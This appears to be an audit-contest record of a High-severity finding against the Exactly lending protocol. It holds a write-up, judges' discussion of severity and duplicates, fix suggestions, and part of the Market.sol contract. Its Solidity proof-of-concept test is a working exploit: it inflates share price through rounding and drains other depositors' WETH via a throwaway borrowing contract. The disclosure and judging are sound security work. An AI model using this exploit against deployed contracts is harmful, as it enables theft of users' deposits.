{
  "Title": "H-1: The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol",
  "Content": "# Issue H-1: The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol \n\nSource: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/41 \n\nThe protocol has acknowledged this issue.\n\n## Found by \n0x73696d616f, kankodu, santipu\\_\n## Summary\n- When the totalSupply of a market is 0, an attacker can take advantage of #1 and #2 to drain the entire protocol.\n\n## Vulnerability Detail\n- The attacker inflates the value of 1 share to a large value, making it sufficient to borrow all the borrowable assets using stealth donation as described in #1 using the original account.\n- They create a throwAway account and mint 1 wei of share to that account as well.\n  - They put up this 1 wei of share as collateral, borrow all the available assets, and transfer them to the original account.\n  - Abandon the market by withdrawing only 1 wei of asset which is allowed, because 1 wei of asset won't be enough to make the position unhealthy (checked using `auditor.shortfall` at the start of the withdrawal). However, this results in 1 whole wei of share (worth a large value) being burnt due to rounding up. See #2.\n  - As a result, the throwaway account will now have 0 collateral and a lot of debt.\n- The original account now has the claim to all the assets as they are the only holder of shares. Since the original account never borrowed, they are able to withdraw all the assets. Additionally, they receive all the borrowed assets that the throwaway account sent to it.\n\n## Impact\n- If the totalSupply of a market is 0, the whole protocol can be drained.\n\n## Code Snippet\n- https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L726\n\n##POC\n- Add below testcase in `test/Market.t.sol`\n```solidity\n\ncontract ThrowAwayAccount {\n  function enterMarketAndBorrow(Market exactlyMarketToEnter, Market exactlyMarketToBorrowFrom) public {\n    exactlyMarketToEnter.auditor().enterMarket(exactlyMarketToEnter);\n\n    //borrow all the available assets\n    exactlyMarketToBorrowFrom.borrow(3000 ether, msg.sender, address(this));\n\n    //abandon the market by withdrawing only 1 wei of asset\n    //this is allowed because 1 wei of asset won't be enough to make postion unhealthy (checked using auditor.shortfall at the start in withdraw)\n    //but results in 1 whole wei of share (worth 8000 ether) being burnt due to rounding up\n    exactlyMarketToEnter.withdraw(1, address(this), address(this));\n\n    //This market will be underwater after that since the 1 wei they deposited as collateral has now been burnt\n  }\n}\n\n function testDrainProtocol() external {\n    marketWETH.asset().transfer(BOB, 3000 ether);\n    //this is the deposit that will be stolen later on\n    vm.prank(BOB);\n    marketWETH.deposit(3000 ether, BOB);\n\n    //These are attacker's interactions that uses DAI market which has 0 totalSupply to drain the protocol (BOB's 3000 ether in this case)\n    uint256 wETHBalanceBefore = marketWETH.asset().balanceOf(address(this));\n    uint256 assetBalanceBefore = market.asset().balanceOf(address(this));\n    //require that the total Supply is zero\n    require(market.totalSupply() == 0, \"totalSupply is not zero\");\n\n    //enter the market\n    market.auditor().enterMarket(market);\n\n    //make a small deposit\n    market.deposit(0.01 ether, address(this));\n    //borrow even smaller amount\n    uint256 borrowShares = market.borrow(0.005 ether, address(this), address(this));\n\n    //wait for 1 block which is enough so that atleast 1 wei is accured as interest\n    vm.roll(block.number + 1);\n    vm.warp(block.timestamp + 10 seconds);\n\n    //deposit a few tokens to accure interest\n    market.deposit(2, address(this));\n\n    //repay all the debt\n    market.refund(borrowShares, address(this));\n\n    //redeem all but 1 wei of the deposit\n    uint256 shares = market.balanceOf(address(this));\n    market.redeem(shares - 1, address(this), address(this));\n\n    require(market.totalAssets() == 2 && market.totalSupply() == 1, \"starting conditions are not as expected\");\n\n    uint256 desiredPricePerShare = 8000 ether;\n    // The loop to inflate the price\n    while (true) {\n      uint256 sharesReceived = market.deposit(market.totalAssets() * 2 - 1, address(this));\n      require(sharesReceived == 1, \"sharesReceived is not 1 as expected\"); //this should have been 1.99999... for larger values of i but it is rounded down to 1\n\n      if (market.totalAssets() > desiredPricePerShare) break;\n\n      uint256 sharesBurnt = market.withdraw(1, address(this), address(this));\n      require(sharesBurnt == 1, \"sharesBunrt is not 1 as expected\"); //this should have been ~0.0000001 for larger values of i but it is rounded up to 1\n    }\n\n    uint256 sharesBurnt = market.withdraw(market.totalAssets() - desiredPricePerShare, address(this), address(this));\n    require(sharesBurnt == 1, \"sharesBunrt is not 1 as expected\");\n\n    require(\n      market.totalAssets() == desiredPricePerShare && market.totalSupply() == 1, \"inflating the price was unsuccessful\"\n    );\n\n    ThrowAwayAccount throwAwayAccount = new ThrowAwayAccount();\n\n    //mint 1 wei of share (worth 8000 ether) to the throwaway account\n    market.mint(1, address(throwAwayAccount));\n    //throwAwayAccount puts up 1 wei of share as collateral, borrows all available assets and then withdraws 1 wei of asset\n    throwAwayAccount.enterMarketAndBorrow(market, marketWETH);\n\n    //this throwaway account now has a lot of debt and no collateral to back it\n    (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(throwAwayAccount), Market(address(0)), 0);\n    assertEq(collateral, 0);\n    assertGt(debt, 3000 ether);\n\n    //attacker gets away with everything\n    market.withdraw(market.totalAssets(), address(this), address(this));\n\n    assertEq(market.asset().balanceOf(address(this)), assetBalanceBefore - 1); //make sure attacker gets back all their assets\n    //in addtion they get the borrowed assets for free\n    assertEq(marketWETH.asset().balanceOf(address(this)), wETHBalanceBefore + 3000 ether);\n  }\n```\n## Tool used\nManual Review\n\n## Recommendation\n- Fix #1 and #2 \n\n\n\n## Discussion\n\n**kankodu**\n\nEscalate\nThe issues mentioned here got scrambled. This report references issues #35 and #40.\n\nIf only the inflation attack vector was present, the protocol couldn't be drained. Only in-motion funds after the inflation attack would have been at risk. \nThis issue is different from a simple inflation attack. This results in the entire TVL being drained by taking advantage of issue #40. \n\n\n**sherlock-admin3**\n\n> Escalate\n> The issues mentioned here got scrambled. This report references issues #35 and #40.\n> \n> If only the inflation attack vector was present, the protocol couldn't be drained. Only in-motion funds after the inflation attack would have been at risk. \n> This issue is different from a simple inflation attack. This results in the entire TVL being drained by taking advantage of issue #40. \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**InfectedIsm**\n\n#248 and #232 attack path are incorrect btw\nFor the inflation to be effective, it requires to accrue interest, and to loss to rounding multiple times, while these submissions attack path are based on the naive first depositor inflation attack\n\n**santipu03**\n\nI marked all these issues as duplicates for the following reason:\n\n- Issues 35, 37, 148, 232, and 248 they just describe the basic inflation attack scenario where the funds from the next depositor can be stolen, IMO those should be medium-severity issues. \n- Issue 141 uses the inflation attack and it leverages so that the entire TVL of the protocol can be drained, this issue should be a high-severity issue. \n\nBecause the root cause of all these issues is the same, i.e. inflating the share value through a donation, according to the Sherlock rules they should be put as duplicates with the highest severity between them all (high). \n\n**kankodu**\n\nThere are protocols that choose not to fix the inflation attack because the reasoning is that if an attacker inflates the market, it will be detected and a new market will be deployed instead. Due to issue #40, draining the protocol is possible. The inflation attack is a separate issue, and this one is different. If issue #40 weren't present, draining wouldn't be possible\n\n**santipu03**\n\nAs I stated before, all issues in this group have the same root cause (inflation attack) even though they have different impacts. According to the Sherlock rules, all issues with the same root cause should be grouped. \n\n**santichez**\n\nHey @kankodu , that's a nice finding :)\nIn Exactly's deployment script as soon as a `Market` is deployed, some shares are deposited and immediately burned and after the timelock schedule and execution, then the `Market` is finally enabled as collateral.\nHowever, the team would like to also work on a simple on-chain fix for this. We were discussing about adding `require(totalSupply > 100);` at the beginning of the `beforeWithdraw` hook. What do you think?\n<img width=\"451\" alt=\"image\" src=\"https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/assets/62035650/0a3b6c15-1c27-4d3d-8306-0ea396e568e0\">\nYour POC test is not succeeding now.\n\n**kankodu**\n\n> We were discussing adding `require(totalSupply > 100);` at the beginning of the `beforeWithdraw` hook.\n\nThis is not a sufficient solution. Without this check, an attacker would have required x$ of flashloaned amount to steal x$ at a time. With this check, an attacker would still be able to steal x$ at a time with 100x$ of flashloaned amount.\n\nI would recommend burning some shares when the total supply is zero in the contract itself when the first deposit happens. Basically, make sure the total supply cannot go between 0 and SOME_MINIMUM_AMOUNT (10000 wei). See [here](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L121) for how Uniswap v2 does it.\n\nYou can also fix this by making sure the total supply is either 0 or greater than SOME_MINIMUM_AMOUNT when depositing and withdrawing so that the first depositor/last withdrawer doesn't lose some dust amounts. See [here](https://github.com/sushiswap/bentobox/blob/f3faba2dfafa89068979b466256208428f1a7055/contracts/BentoBox.sol#L194) for how it is done in Sushiswap's BentoBox.\n\n\n**cvetanovv**\n\nThe root cause of this issue and the duplicate issues is the Inflation Attack. Even if the duplicates are Medium severity or describe a slightly different attack, we can duplicate them with a High severity issue according to the [rules](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules).\n\n> There is a root cause/error/vulnerability A in the code. This vulnerability A -> leads to two attack paths:\n> - B -> high severity path\n> - C -> medium severity attack path/just identifying the vulnerability.\n> Both B & C would not have been possible if error A did not exist in the first place. In this case, both B & C should be put together as duplicates.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Evert0x**\n\nResult:\nHigh\nHas Duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [kankodu](https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/41/#issuecomment-2117349808): rejected\n\n**InfectedIsm**\n\nFYI, you're validating invalid submission here @cvetanovv @Evert0x \nAttack path is incorrect and do not lead to inflation, direct donation are not possible because vault do not use balanceOf but a state variable to account for assets\nThe main vector here wait few seconds/minutes such as interest will appear, imbalancing assets and shares, making rounding issue possible then.\n\n> #248 and #232 attack path are incorrect btw For the inflation to be effective, it requires to accrue interest, and to loss to rounding multiple times, while these submissions attack path are based on the naive first depositor inflation attack\n\n\n\n**cvetanovv**\n\n> FYI, you're validating invalid submission here @cvetanovv @Evert0x Attack path is incorrect and do not lead to inflation, direct donation are not possible because vault do not use balanceOf but a state variable to account for assets The main vector here wait few seconds/minutes such as interest will appear, imbalancing assets and shares, making rounding issue possible then.\n> \n> > #248 and #232 attack path are incorrect btw For the inflation to be effective, it requires to accrue interest, and to loss to rounding multiple times, while these submissions attack path are based on the naive first depositor inflation attack\n\nThe Lead Judge duplicated them because they found the issue's root cause in the Market. \n@santipu03 What do you think about this comment?\n\n**santipu03**\n\n@InfectedIsm I don't quite understand what you mean there. \n\nAre you arguing that this issue (#41) is invalid, as well as all its duplicates? Or are you arguing that issues #248 and #232 should be invalid? If so, explain your reasons clearly, please.\n\n**InfectedIsm**\n\n@santipu03 my bad, #232 seems to have the right attack path.\n\nbut #248 don't I think, it describe the \"simple\" inflation attack and no more, which isn't possible as it is:\n> In short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.\n\nFor the reason #232 describe:\n>However, in Exactly, there is a safeguards in place to mitigate this attack. The market tracks the number of collateral assets within the state variables. Thus, simply transferring assets to the market directly will not work, and the assets per share will remain the same. Thus, one would need to perform additional steps to workaround/bypass the existing controls.\n> [...]\n\nThen not sure if this attack path works as it is different from other duplicates, but at least seems to grasp the same idea: \n> Attacker can inflate backupEarnings by sequently depositAtMaturity and borrowAtMaturity. Such operation will not trigger depositToTreasury() because updateFloatingDebt() will always return 0 at a no-debt market.\n\n**santipu03**\n\n@InfectedIsm I agree with you that issue #248 doesn't describe the most important part of the attack path, which is the **stealth donation**. It seems that issue #248 is just a copy-paste of a report on the classic inflation attack without checking first if it would work within this protocol, and I think it would have been invalidated if judged as a standalone report. \n\nOn the other hand, issue #232 describes the following attack path:\n> Attacker can inflate backupEarnings by sequently depositAtMaturity and borrowAtMaturity. Such operation will not trigger depositToTreasury() because updateFloatingDebt() will always return 0 at a no-debt market.\n\nAfter analyzing this attack sequence, I've arrived at the conclusion that is invalid. When the attacker deposits at maturity, he won't receive any fee because there are no borrows so the deposited funds will sit idle on the fixed pool. After that, if the attacker borrows at maturity, the fee paid will be considered _free lunch_ so it will be directed to the treasury. After these two operations, the attacker hasn't donated any funds to the floating assets because the funds have been directed to the treasury. In conclusion, following this attack path won't lead to inflating the share price. \n\nAfter reassessing reports #248 and #232, I believe they should be invalidated because of the lack of a valid attack path, but I honestly don't know if it's allowed to do that at this point.\nCC. @cvetanovv \n\n\n**cvetanovv**\n\nWe're still in an escalation period, and these duplicates are related to an escalated issue, so we can change them. \n\nI agree that #248 does not specify an attack path and seems like a copy-paste issue. \n#232 shows the incorrect attack path and, according to the rules, should also be invalid.\n\n> In addition to this, there is a submission D which identifies the core issue but does not clearly describe the impact **or an attack path**. Then D is considered low.\n\nBoth issues have found the root cause, but they should be low because of the wrong attack path. \n\nThere may soon be improvements to the duplicate rules and it will be easier to identify duplicates.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/247",
  "Code": [
    {
      "filename": "protocol/contracts/Market.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.17;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { FixedPointMathLib } from \"solmate/src/utils/FixedPointMathLib.sol\";\nimport { PausableUpgradeable } from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\nimport { MathUpgradeable as Math } from \"@openzeppelin/contracts-upgradeable/utils/math/MathUpgradeable.sol\";\nimport { AccessControlUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";\nimport { ERC4626, ERC20, SafeTransferLib } from \"solmate/src/mixins/ERC4626.sol\";\nimport { InterestRateModel } from \"./InterestRateModel.sol\";\nimport { RewardsController } from \"./RewardsController.sol\";\nimport { FixedLib } from \"./utils/FixedLib.sol\";\nimport { Auditor } from \"./Auditor.sol\";\n\ncontract Market is Initializable, AccessControlUpgradeable, PausableUpgradeable, ERC4626 {\n  using FixedPointMathLib for int256;\n  using FixedPointMathLib for uint256;\n  using FixedPointMathLib for uint128;\n  using SafeTransferLib for ERC20;\n  using FixedLib for FixedLib.Pool;\n  using FixedLib for FixedLib.Position;\n  using FixedLib for uint256;\n\n  bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n  bytes32 public constant EMERGENCY_ADMIN_ROLE = keccak256(\"EMERGENCY_ADMIN_ROLE\");\n\n  /// @custom:oz-upgrades-unsafe-allow state-variable-immutable\n  Auditor public immutable auditor;\n\n  /// @notice Tracks account's fixed deposit positions by maturity, account and position.\n  mapping(uint256 => mapping(address => FixedLib.Position)) public fixedDepositPositions;\n  /// @notice Tracks account's fixed borrow positions by maturity, account and position.\n  mapping(uint256 => mapping(address => FixedLib.Position)) public fixedBorrowPositions;\n  /// @notice Tracks fixed pools state by maturity.\n  mapping(uint256 => FixedLib.Pool) public fixedPools;\n\n  /// @notice Tracks fixed deposit and borrow map and floating borrow shares of an account.\n  mapping(address => Account) public accounts;\n\n  /// @notice Amount of assets lent by the floating pool to the fixed pools.\n  uint256 public floatingBackupBorrowed;\n  /// @notice Amount of assets lent by the floating pool to accounts.\n  uint256 public floatingDebt;\n\n  /// @notice Accumulated earnings from extraordinary sources to be gradually distributed.\n  uint256 public earningsAccumulator;\n  /// @notice Rate per second to be charged to delayed fixed pools borrowers after maturity.\n  uint256 public penaltyRate;\n  /// @notice Rate charged to the fixed pool to be retained by the floating pool for initially providing liquidity.\n  uint256 public backupFeeRate;\n  /// @notice Damp speed factor to update `floatingAssetsAverage` when `floatingAssets` is higher.\n  uint256 public dampSpeedUp;\n  /// @notice Damp speed factor to update `floatingAssetsAverage` when `floatingAssets` is lower.\n  uint256 public dampSpeedDown;\n\n  /// @notice Number of fixed pools to be active at the same time.\n  uint8 public maxFuturePools;\n  /// @notice Last time the accumulator distributed earnings.\n  uint32 public lastAccumulatorAccrual;\n  /// @notice Last time the floating debt was updated.\n  uint32 public lastFloatingDebtUpdate;\n  /// @notice Last time the floating assets average was updated.\n  uint32 public lastAverageUpdate;\n\n  /// @notice Interest rate model contract used to get the borrow rates.\n  InterestRateModel public interestRateModel;\n\n  /// @notice Factor used for gradual accrual of earnings to the floating pool.\n  uint128 public earningsAccumulatorSmoothFactor;\n  /// @notice Percentage factor that represents the liquidity reserves that can't be borrowed.\n  uint128 public reserveFactor;\n\n  /// @notice Amount of floating assets deposited to the pool.\n  uint256 public floatingAssets;\n  /// @notice Average of the floating assets to get fixed borrow rates and prevent rate manipulation.\n  uint256 public floatingAssetsAverage;\n\n  /// @notice Total amount of floating borrow shares assigned to floating borrow accounts.\n  uint256 public totalFloatingBorrowShares;\n\n  /// @dev gap from deprecated state.\n  /// @custom:oz-renamed-from floatingUtilization\n  uint256 private __gap;\n\n  /// @notice Address of the treasury that will receive the allocated earnings.\n  address public treasury;\n  /// @notice Rate to be charged by the treasury to floating and fixed borrows.\n  uint256 public treasuryFeeRate;\n\n  /// @notice Address of the rewards controller that will accrue rewards for accounts operating with the Market.\n  RewardsController public rewardsController;\n\n  /// @notice Flag to prevent new borrows and deposits.\n  bool public isFrozen;\n\n  /// @custom:oz-upgrades-unsafe-allow constructor\n  constructor(ERC20 asset_, Auditor auditor_) ERC4626(asset_, \"\", \"\") {\n    auditor = auditor_;\n\n    _disableInitializers();\n  }\n\n  /// @notice Initializes the contract.\n  /// @dev can only be called once.\n  function initialize(\n    string calldata assetSymbol,\n    uint8 maxFuturePools_,\n    uint128 earningsAccumulatorSmoothFactor_,\n    InterestRateModel interestRateModel_,\n    uint256 penaltyRate_,\n    uint256 backupFeeRate_,\n    uint128 reserveFactor_,\n    uint256 dampSpeedUp_,\n    uint256 dampSpeedDown_\n  ) external initializer {\n    __AccessControl_init();\n    __Pausable_init();\n\n    lastAccumulatorAccrual = uint32(block.timestamp);\n    lastFloatingDebtUpdate = uint32(block.timestamp);\n    lastAverageUpdate = uint32(block.timestamp);\n\n    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n    setAssetSymbol(assetSymbol);\n    setMaxFuturePools(maxFuturePools_);\n    setEarningsAccumulatorSmoothFactor(earningsAccumulatorSmoothFactor_);\n    setInterestRateModel(interestRateModel_);\n    setPenaltyRate(penaltyRate_);\n    setBackupFeeRate(backupFeeRate_);\n    setReserveFactor(reserveFactor_);\n    setDampSpeed(dampSpeedUp_, dampSpeedDown_);\n  }\n\n  /// @notice Borrows a certain amount from the floating pool.\n  /// @param assets amount to be sent to receiver and repaid by borrower.\n  /// @param receiver address that will receive the borrowed assets.\n  /// @param borrower address that will repay the borrowed assets.\n  /// @return borrowShares shares corresponding to the borrowed assets.\n  function borrow(\n    uint256 assets,\n    address receiver,\n    address borrower\n  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {\n    spendAllowance(borrower, assets);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    depositToTreasury(updateFloatingDebt());\n\n    borrowShares = previewBorrow(assets);\n\n    uint256 newFloatingDebt = floatingDebt + assets;\n    floatingDebt = newFloatingDebt;\n    // check if the underlying liquidity that the account wants to withdraw is borrowed, also considering the reserves\n    if (floatingBackupBorrowed + newFloatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {\n      revert InsufficientProtocolLiquidity();\n    }\n\n    totalFloatingBorrowShares += borrowShares;\n    accounts[borrower].floatingBorrowShares += borrowShares;\n\n    emit Borrow(msg.sender, receiver, borrower, assets, borrowShares);\n    emitMarketUpdate();\n\n    auditor.checkBorrow(this, borrower);\n    asset.safeTransfer(receiver, assets);\n  }\n\n  /// @notice Repays a certain amount of assets to the floating pool.\n  /// @param assets assets to be subtracted from the borrower's accountability.\n  /// @param borrower address of the account that has the debt.\n  /// @return actualRepay the actual amount that should be transferred into the protocol.\n  /// @return borrowShares subtracted shares from the borrower's accountability.\n  function repay(\n    uint256 assets,\n    address borrower\n  ) external whenNotPaused returns (uint256 actualRepay, uint256 borrowShares) {\n    (actualRepay, borrowShares) = noTransferRefund(previewRepay(assets), borrower);\n    emitMarketUpdate();\n    asset.safeTransferFrom(msg.sender, address(this), actualRepay);\n  }\n\n  /// @notice Repays a certain amount of shares to the floating pool.\n  /// @param borrowShares shares to be subtracted from the borrower's accountability.\n  /// @param borrower address of the account that has the debt.\n  /// @return assets subtracted assets from the borrower's accountability.\n  /// @return actualShares actual subtracted shares from the borrower's accountability.\n  function refund(\n    uint256 borrowShares,\n    address borrower\n  ) external whenNotPaused returns (uint256 assets, uint256 actualShares) {\n    (assets, actualShares) = noTransferRefund(borrowShares, borrower);\n    emitMarketUpdate();\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n  }\n\n  /// @notice Allows to (partially) repay a floating borrow. It does not transfer assets.\n  /// @param borrowShares shares to be subtracted from the borrower's accountability.\n  /// @param borrower the address of the account that has the debt.\n  /// @return assets the actual amount that should be transferred into the protocol.\n  /// @return actualShares actual subtracted shares from the borrower's accountability.\n  function noTransferRefund(\n    uint256 borrowShares,\n    address borrower\n  ) internal returns (uint256 assets, uint256 actualShares) {\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    depositToTreasury(updateFloatingDebt());\n    Account storage account = accounts[borrower];\n    uint256 accountBorrowShares = account.floatingBorrowShares;\n    actualShares = Math.min(borrowShares, accountBorrowShares);\n    assets = previewRefund(actualShares);\n\n    if (assets == 0) revert ZeroRepay();\n\n    floatingDebt -= assets;\n    account.floatingBorrowShares = accountBorrowShares - actualShares;\n    totalFloatingBorrowShares -= actualShares;\n\n    emit Repay(msg.sender, borrower, assets, actualShares);\n  }\n\n  /// @notice Deposits a certain amount to a maturity.\n  /// @param maturity maturity date where the assets will be deposited.\n  /// @param assets amount to receive from the msg.sender.\n  /// @param minAssetsRequired minimum amount of assets required by the depositor for the transaction to be accepted.\n  /// @param receiver address that will be able to withdraw the deposited assets.\n  /// @return positionAssets total amount of assets (principal + fee) to be withdrawn at maturity.\n  function depositAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 minAssetsRequired,\n    address receiver\n  ) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {\n    if (assets == 0) revert ZeroDeposit();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.NONE);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n\n    uint256 backupEarnings = pool.accrueEarnings(maturity);\n    floatingAssets += backupEarnings;\n\n    (uint256 fee, uint256 backupFee) = pool.calculateDeposit(assets, backupFeeRate);\n    positionAssets = assets + fee;\n    if (positionAssets < minAssetsRequired) revert Disagreement();\n\n    floatingBackupBorrowed -= pool.deposit(assets);\n    pool.unassignedEarnings -= fee + backupFee;\n    earningsAccumulator += backupFee;\n\n    // update account's position\n    FixedLib.Position storage position = fixedDepositPositions[maturity][receiver];\n\n    // if account doesn't have a current position, add it to the list\n    if (position.principal == 0) {\n      Account storage account = accounts[receiver];\n      account.fixedDeposits = account.fixedDeposits.setMaturity(maturity);\n    }\n\n    position.principal += assets;\n    position.fee += fee;\n\n    emit DepositAtMaturity(maturity, msg.sender, receiver, assets, fee);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n  }\n\n  /// @notice Borrows a certain amount from a maturity.\n  /// @param maturity maturity date for repayment.\n  /// @param assets amount to be sent to receiver and repaid by borrower.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept.\n  /// @param receiver address that will receive the borrowed assets.\n  /// @param borrower address that will repay the borrowed assets.\n  /// @return assetsOwed total amount of assets (principal + fee) to be repaid at maturity.\n  function borrowAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 maxAssets,\n    address receiver,\n    address borrower\n  ) external whenNotPaused whenNotFrozen returns (uint256 assetsOwed) {\n    if (assets == 0) revert ZeroBorrow();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.NONE);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n    floatingAssets += pool.accrueEarnings(maturity);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    {\n      uint256 backupDebtAddition = pool.borrow(assets);\n      if (backupDebtAddition != 0) {\n        uint256 newFloatingBackupBorrowed = floatingBackupBorrowed + backupDebtAddition;\n        depositToTreasury(updateFloatingDebt());\n        if (newFloatingBackupBorrowed + floatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {\n          revert InsufficientProtocolLiquidity();\n        }\n        floatingBackupBorrowed = newFloatingBackupBorrowed;\n      }\n    }\n    uint256 fee;\n    {\n      uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();\n      uint256 memFloatingDebt = floatingDebt;\n      uint256 fixedRate = interestRateModel.fixedRate(\n        maturity,\n        maxFuturePools,\n        fixedUtilization(pool.supplied, pool.borrowed, memFloatingAssetsAverage),\n        floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),\n        globalUtilization(memFloatingAssetsAverage, memFloatingDebt, floatingBackupBorrowed)\n      );\n      fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));\n    }\n    assetsOwed = assets + fee;\n\n    // validate that the account is not taking arbitrary fees\n    if (assetsOwed > maxAssets) revert Disagreement();\n\n    spendAllowance(borrower, assetsOwed);\n\n    {\n      // if account doesn't have a current position, add it to the list\n      FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];\n      if (position.principal == 0) {\n        Account storage account = accounts[borrower];\n        account.fixedBorrows = account.fixedBorrows.setMaturity(maturity);\n      }\n\n      // calculate what portion of the fees are to be accrued and what portion goes to earnings accumulator\n      (uint256 newUnassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(\n        chargeTreasuryFee(fee),\n        assets\n      );\n      if (newUnassignedEarnings != 0) pool.unassignedEarnings += newUnassignedEarnings;\n      collectFreeLunch(newBackupEarnings);\n\n      fixedBorrowPositions[maturity][borrower] = FixedLib.Position(position.principal + assets, position.fee + fee);\n    }\n\n    emit BorrowAtMaturity(maturity, msg.sender, receiver, borrower, assets, fee);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    auditor.checkBorrow(this, borrower);\n    asset.safeTransfer(receiver, assets);\n  }\n\n  /// @notice Withdraws a certain amount from a maturity.\n  /// @param maturity maturity date where the assets will be withdrawn.\n  /// @param positionAssets position size to be reduced.\n  /// @param minAssetsRequired minimum amount required by the account (if discount included for early withdrawal).\n  /// @param receiver address that will receive the withdrawn assets.\n  /// @param owner address that previously deposited the assets.\n  /// @return assetsDiscounted amount of assets withdrawn (can include a discount for early withdraw).\n  function withdrawAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 minAssetsRequired,\n    address receiver,\n    address owner\n  ) external whenNotPaused returns (uint256 assetsDiscounted) {\n    if (positionAssets == 0) revert ZeroWithdraw();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.MATURED);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n    floatingAssets += pool.accrueEarnings(maturity);\n\n    FixedLib.Position memory position = fixedDepositPositions[maturity][owner];\n\n    if (positionAssets > position.principal + position.fee) positionAssets = position.principal + position.fee;\n\n    {\n      // remove the supply from the fixed rate pool\n      uint256 newFloatingBackupBorrowed = floatingBackupBorrowed +\n        pool.withdraw(\n          FixedLib.Position(position.principal, position.fee).scaleProportionally(positionAssets).principal\n        );\n      if (newFloatingBackupBorrowed + floatingDebt > floatingAssets) revert InsufficientProtocolLiquidity();\n      floatingBackupBorrowed = newFloatingBackupBorrowed;\n    }\n\n    // verify if there are any penalties/fee for the account because of early withdrawal, if so discount\n    if (block.timestamp < maturity) {\n      uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();\n      uint256 memFloatingDebt = floatingDebt;\n      uint256 memFloatingBackupBorrowed = floatingBackupBorrowed;\n\n      uint256 fixedRate = interestRateModel.fixedRate(\n        maturity,\n        maxFuturePools,\n        fixedUtilization(pool.supplied, pool.borrowed, memFloatingAssetsAverage),\n        floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),\n        globalUtilization(memFloatingAssetsAverage, memFloatingDebt, memFloatingBackupBorrowed)\n      );\n      assetsDiscounted = positionAssets.divWadDown(1e18 + fixedRate.mulDivDown(maturity - block.timestamp, 365 days));\n    } else {\n      assetsDiscounted = positionAssets;\n    }\n\n    if (assetsDiscounted < minAssetsRequired) revert Disagreement();\n\n    spendAllowance(owner, assetsDiscounted);\n\n    // all the fees go to unassigned or to the floating pool\n    (uint256 unassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(\n      chargeTreasuryFee(positionAssets - assetsDiscounted),\n      assetsDiscounted\n    );\n    pool.unassignedEarnings += unassignedEarnings;\n    collectFreeLunch(newBackupEarnings);\n\n    // the account gets discounted the full amount\n    position.reduceProportionally(positionAssets);\n    if (position.principal | position.fee == 0) {\n      delete fixedDepositPositions[maturity][owner];\n      Account storage account = accounts[owner];\n      account.fixedDeposits = account.fixedDeposits.clearMaturity(maturity);\n    } else {\n      // proportionally reduce the values\n      fixedDepositPositions[maturity][owner] = position;\n    }\n\n    emit WithdrawAtMaturity(maturity, msg.sender, receiver, owner, positionAssets, assetsDiscounted);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    asset.safeTransfer(receiver, assetsDiscounted);\n  }\n\n  /// @notice Repays a certain amount to a maturity.\n  /// @param maturity maturity date where the assets will be repaid.\n  /// @param positionAssets amount to be paid for the borrower's debt.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept to be repaid.\n  /// @param borrower address of the account that has the debt.\n  /// @return 